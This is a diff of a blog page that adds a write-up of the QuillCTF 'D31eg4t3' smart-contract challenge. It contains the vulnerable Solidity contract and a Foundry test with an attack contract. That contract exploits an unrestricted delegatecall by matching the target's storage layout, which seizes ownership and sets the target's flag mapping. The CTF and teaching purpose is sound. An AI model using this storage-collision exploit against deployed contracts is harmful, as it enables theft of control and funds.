@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Born2Be">
+    <meta name="description" content="Objective  Become the owner of the contract. Make canYouHackMe mapping to true for your own address.  Code123456789101112131415161718192021222324252627282930313233&#x2F;&#x2F; SPDX-License-Identifier: MITpragma">
 <meta property="og:type" content="article">
 <meta property="og:title" content="QuillCTF-5.D31eg4t3">
 <meta property="og:url" content="http://example.com/2024/01/22/QuillCTF-5-D31eg4t3/index.html">
 <meta property="og:site_name" content="KK&#39;s Note">
-<meta property="og:description" content="Born2Be">
+<meta property="og:description" content="Objective  Become the owner of the contract. Make canYouHackMe mapping to true for your own address.  Code123456789101112131415161718192021222324252627282930313233&#x2F;&#x2F; SPDX-License-Identifier: MITpragma">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-01-22T09:00:44.000Z">
-<meta property="article:modified_time" content="2024-01-22T09:06:48.149Z">
+<meta property="article:modified_time" content="2024-01-23T05:33:18.075Z">
 <meta property="article:author" content="KKontheway">
 <meta name="twitter:card" content="summary">
     
@@ -117,6 +117,10 @@
     </div>
     
     
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Code"><span class="toc-number">1.</span> <span class="toc-text">Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Observation"><span class="toc-number">2.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack"><span class="toc-number">3.</span> <span class="toc-text">Attack</span></a></li></ol>
+      </div>
+    
   </span>
 </div>
 
@@ -159,7 +163,14 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    
+    <p>Objective</p>
+<ol>
+<li>Become the owner of the contract.</li>
+<li>Make canYouHackMe mapping to true for your own address.</li>
+</ol>
+<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract D31eg4t3&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    uint a = 12345;</span><br><span class="line">    uint8 b = 32;</span><br><span class="line">    string private d; </span><br><span class="line">    uint32 private c; </span><br><span class="line">    string private mot;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping (address =&gt; bool) public canYouHackMe;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        require(false, &quot;Not a Owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hackMe(bytes calldata bites) public returns(bool, bytes memory) &#123;</span><br><span class="line">        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);</span><br><span class="line">        return (r, msge);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function hacked() public onlyOwner&#123;</span><br><span class="line">        canYouHackMe[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/D31eg4t3.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    uint a = 12345;</span><br><span class="line">    uint8 b = 32;</span><br><span class="line">    string private d; </span><br><span class="line">    uint32 private c; </span><br><span class="line">    string private mot;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping (address =&gt; bool) public canYouHackMe;</span><br><span class="line"></span><br><span class="line">    function attack(address delegateAddress, address attackerAddress) public&#123;</span><br><span class="line">        D31eg4t3 delegateContract = D31eg4t3(delegateAddress);</span><br><span class="line">        delegateContract.hackMe(abi.encodeWithSignature(&quot;pwn(address)&quot;, attackerAddress));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn(address attackerAddress) public &#123;</span><br><span class="line">        owner = attackerAddress;</span><br><span class="line">        canYouHackMe[attackerAddress] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract testCon is Test &#123;    </span><br><span class="line">    D31eg4t3 _contract;</span><br><span class="line">    address owner;</span><br><span class="line">    address attacker;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        owner = vm.addr(1);</span><br><span class="line">        attacker = vm.addr(2);</span><br><span class="line">        vm.startPrank(owner);</span><br><span class="line">        _contract = new D31eg4t3();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        Attack att = new Attack();</span><br><span class="line">        att.attack(address(_contract), attacker);</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        assertEq(_contract.owner(), attacker);</span><br><span class="line">        assert(_contract.canYouHackMe(attacker) == true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
   </div>
 </article>
 
@@ -189,6 +200,10 @@
 
     
     
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Code"><span class="toc-number">1.</span> <span class="toc-text">Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Observation"><span class="toc-number">2.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack"><span class="toc-number">3.</span> <span class="toc-text">Attack</span></a></li></ol>
+      </div>
+    
 
     <div id="share-footer" style="display: none">
       <ul>
@@ -209,6 +224,8 @@
 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
